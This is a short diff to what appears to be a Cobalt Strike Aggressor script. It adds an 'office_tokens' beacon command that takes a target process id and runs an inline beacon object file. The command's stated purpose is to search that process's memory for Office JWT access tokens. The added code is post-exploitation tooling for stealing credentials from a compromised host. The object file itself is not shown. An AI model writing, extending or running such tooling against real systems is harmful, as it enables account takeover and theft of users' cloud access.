@@ -1361,3 +1361,26 @@ Usage:   adcs_request /CA:ca [/TEMPLATE:template] [/SUBJECT:subject] [/ALTNAME:a
          MACHINE   Optional. Request a certificate for a machine instead of a user?
 "
 );
+
+alias office_tokens 
+{
+	local('$pid $args');
+	if(size(@_) != 2)
+	{
+		berror($1, "usage: office_tokens <pid>");
+		return;
+	}
+	$pid = parseNumber($2, 10);
+    berror($1, $pid);
+
+	$args = bof_pack($1, "i", $pid);
+	beacon_inline_execute($1, readbof($1, "office_tokens"), "go", $args);
+}
+
+beacon_command_register(
+	"office_tokens",
+	"Searches memory for Office JWT Access Tokens",
+	"Command: office_tokens
+
+Usage: office_tokens <pid> "
+);
